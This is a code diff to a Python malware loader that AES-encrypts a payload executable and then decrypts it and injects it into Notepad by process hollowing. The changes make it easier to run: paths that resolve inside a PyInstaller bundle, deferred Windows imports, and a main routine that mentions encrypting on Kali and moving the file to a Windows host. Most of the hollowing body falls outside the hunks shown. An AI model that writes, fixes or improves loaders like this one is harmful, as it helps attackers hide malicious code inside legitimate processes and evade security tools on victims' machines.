@@ -2,12 +2,9 @@ import base64
 import os
 import ctypes
 import struct
-import win32api
-import win32process
-import win32con
-import psutil
 import time
 import logging
+import sys
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
@@ -18,9 +15,14 @@ logging.basicConfig(
     datefmt="%H:%M:%S"
 )
 
-# File Paths
-executor_path = r"" # Payload PATH
-encrypted_path = r"" # Enc PATH
+# File Paths (resolve relative to script or bundled EXE)
+if getattr(sys, 'frozen', False):
+    # Running as a PyInstaller bundle
+    BASE_DIR = os.path.dirname(sys.executable)
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+executor_path = os.path.join(BASE_DIR, "payloads", "Executor.exe")  # Payload PATH
+encrypted_path = os.path.join(BASE_DIR, "enc", "Executor.enc")      # Enc PATH
 
 # AES Key (16 bytes)
 key = b'Sixteen byte key'
@@ -43,6 +45,9 @@ def encrypt_executor():
         encrypted_data = cipher.encrypt(pad(data, AES.block_size))
         logging.debug(f"[ENCRYPTION] Encryption completed in {time.time() - start_time:.4f} seconds")
 
+        # Ensure destination directory exists
+        os.makedirs(os.path.dirname(encrypted_path), exist_ok=True)
+
         with open(encrypted_path, "wb") as f:
             f.write(base64.b64encode(encrypted_data))
         logging.info(f"[ENCRYPTION] Encrypted file saved at: {encrypted_path}")
@@ -56,6 +61,21 @@ def encrypt_executor():
 def decrypt_and_hollow():
     """ Decrypt Executor.enc and perform process hollowing into Notepad """
     logging.info("[DECRYPTION] Starting decryption & process hollowing...")
+
+    # Ensure we're running on Windows before importing Windows-specific modules
+    if os.name != 'nt':
+        logging.error("[PLATFORM] Process hollowing requires Windows. Detected: %s", os.name)
+        return False
+
+    try:
+        import win32api
+        import win32process
+        import win32con
+        import psutil
+    except Exception as e:
+        logging.error("[DEPENDENCY] Missing Windows dependencies (pywin32/psutil): %s", e)
+        logging.error("[DEPENDENCY] On Windows, install via: pip install pywin32 psutil pycryptodome")
+        return False
 
     if not os.path.exists(encrypted_path):
         logging.error(f"[DECRYPTION] File not found: {encrypted_path}")
@@ -171,6 +191,19 @@ def decrypt_and_hollow():
     logging.info("[SUCCESS] Process Hollowing Completed Successfully.")
     return True
 
-# Run Encryption & Hollowing
-if encrypt_executor():
-    decrypt_and_hollow()
+if __name__ == "__main__":
+    # Encrypt if payload exists (works on Kali/Windows)
+    if os.path.exists(executor_path):
+        encrypt_executor()
+    else:
+        logging.info("[ENCRYPTION] Payload not found; skipping encryption. Path: %s", executor_path)
+
+    # Hollow only on Windows if .enc is available
+    if os.name == 'nt':
+        if os.path.exists(encrypted_path):
+            decrypt_and_hollow()
+        else:
+            logging.error("[DECRYPTION] Encrypted file not found: %s", encrypted_path)
+    else:
+        logging.info("[INFO] Non-Windows environment detected. Skipping hollowing.")
+        logging.info("[INFO] Move the generated .enc file to a Windows host and run there.")
